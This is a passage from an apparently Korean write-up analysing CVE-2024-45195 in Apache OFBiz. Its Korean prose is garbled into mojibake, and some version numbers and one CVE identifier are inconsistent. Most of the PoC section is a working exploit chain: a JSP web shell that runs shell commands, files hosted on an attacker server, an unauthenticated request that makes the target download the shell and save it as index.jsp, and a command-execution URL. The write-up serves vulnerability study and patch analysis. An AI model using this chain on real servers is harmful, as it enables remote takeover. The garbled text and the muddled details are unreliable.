ì´ë ‡ê²Œ ì €ì¥ëœ JSP íŒŒì¼ì€ ì›¹ ì„œë²„ì—ì„œ ì‹¤í–‰ ê°€ëŠ¥í•œ ìƒíƒœê°€ ë˜ì–´ ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE) ì·¨ì•½ì ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤. ì´ì— ëŒ€í•œ ë‚´ìš©ì€ ì•„ë˜ PoC ê³¼ì •ì—ì„œ ë‹¤ì‹œ ì§„í–‰í•´ë³´ê² ìŠµë‹ˆë‹¤.

# PoC

## ê³µê²©ì ì„œë²„ ì¤€ë¹„

ì¤€ë¹„ëœ ì„œë²„ì— ì•„ë˜ì˜ 2ê°œ íŒŒì¼ì„ ì €ì¥í•©ë‹ˆë‹¤.

ğŸ”Â test.xml

```xml
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
      <record name="rceentry" limit="many">
          <field name="jsp" type="String" length="605" position="0"></field>
      </record>
  </data-file>
</data-files>
```

ğŸ”Â test.csv

```xml
<%@ page import='java.io.*' %><%@ page import='java.util.*' %><b>Exploit</b><br><% String getcmd = request.getParameter("cmd"); if (getcmd != null) { out.println("Command: " + getcmd + "<br>"); String cmd1 = "/bin/sh"; String cmd2 = "-c"; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %>,
```

![images](./images/image-008.png)

ì´í›„ python ì„ ì´ìš©í•˜ì—¬ í•´ë‹¹ ê²½ë¡œë¥¼ 80í¬íŠ¸ë¡œ ë¦¬ìŠ¤ë‹í•˜ëŠ” ì›¹ ì„œë²„ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

```xml
python -m http.server 80
```

![images](./images/image-009.png)

## viewdatafile ìš”ì²­

ì´í›„ ë‹¤ìŒì˜ ìš”ì²­ íŒ¨í‚·ì„ Apache OFBiz í”„ë ˆì„ì›Œí¬ 18.14.15 ë²„ì „ì— ìš”ì²­ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

```xml
POST /webtools/control/main/viewdatafile HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 241

DATAFILE_LOCATION=http://<ì„œë²„ì£¼ì†Œ>:80/test.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://<ì„œë²„ì£¼ì†Œ>:80/test.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce
```

![images](./images/image-010.png)

ìœ„ ìš”ì²­ì´ ì •ìƒì ìœ¼ë¡œ ì²˜ë¦¬ ë˜ì—ˆìœ¼ë©´, ê³µê²©ì ì„œë²„ ë¡œê·¸ì—ì„œ `test.xml`, `test.csv` íŒŒì¼ì— ëŒ€í•œ ì ‘ê·¼ ë¡œê·¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![images](./images/image-011.png)

## ì›¹ì‰˜ í™•ì¸

Apache OFBiz ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì›¹ ì‰˜ì´ ì €ì¥ ë˜ì—ˆëŠ”ì§€, ì•„ë˜ì˜ URL ìš”ì²­ì„ ì´ìš©í•˜ì—¬ í™•ì¸í•©ë‹ˆë‹¤.

```xml
https://localhost:8443/accounting/index.jsp?cmd=ls -al
```

![images](./images/image-012.png)

# Patch

ì´ë²ˆ `CVE-2024-45195` ì·¨ì•½ì ì€ ì´ì „ì— ë°œìƒí•œ ì„¸ ê°€ì§€ ì·¨ì•½ì (`CVE-2024-32113`, `CVE-2024-36104`, `CVE-2204-38856`)ê³¼ ë™ì¼í•˜ê²Œ URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜ì—ì„œ ì»¨íŠ¸ë¡¤ëŸ¬ì™€ ë·°ì˜ ë§¤í•‘ ì²˜ë¦¬ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” ì˜ëª»ëœ ì¸ì¦ ì²˜ë¦¬ë¡œ ì¸í•´ ë°œìƒë˜ì—ˆìŠµë‹ˆë‹¤.

ì´ì— ëŒ€í•œ ë‚´ìš©ì€ Apache OFBiz í”„ë ˆì„ì›Œí¬ ë²„ì „ 18.15.16ì—ì„œ ë·° ë Œë”ë§ ì‹œ ê¶Œí•œì„ ê²€ì‚¬í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ íŒ¨ì¹˜ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> [https://github.com/apache/ofbiz-framework/compare/release18.12.15...release18.12.16](https://github.com/apache/ofbiz-framework/compare/release18.12.15...release18.12.16)
> 

![images](./images/image-013.png)

ë”°ë¼ì„œ, íŒ¨ì¹˜ëœ ë²„ì „ 18.15.16 ì—ì„œ `CVE-2024-45195` ì·¨ì•½ì ì˜ PoCë¥¼ ìˆ˜í–‰í•  ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ì¸ì´ í•„ìš”í•˜ë‹¤ëŠ” ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ë°›ê²Œë©ë‹ˆë‹¤.

![images](./images/image-014.png)

# Continueâ€¦

ë‹¤ìŒì€ ë‹¤ì„¯ ë²ˆì§¸ CVE ì·¨ì•½ì ì¸ [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/Apache%20OFBiz%201-Day%20Analysis/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.

---

# References

- https://issues.apache.org/jira/browse/OFBIZ-13130
- https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/
- https://github.com/apache/ofbiz-framework/blob/3bee351e39dc5d99f40081b3c5bfa365d787ed6e/framework/datafile/src/docs/asciidoc/datafiles.adoc#L70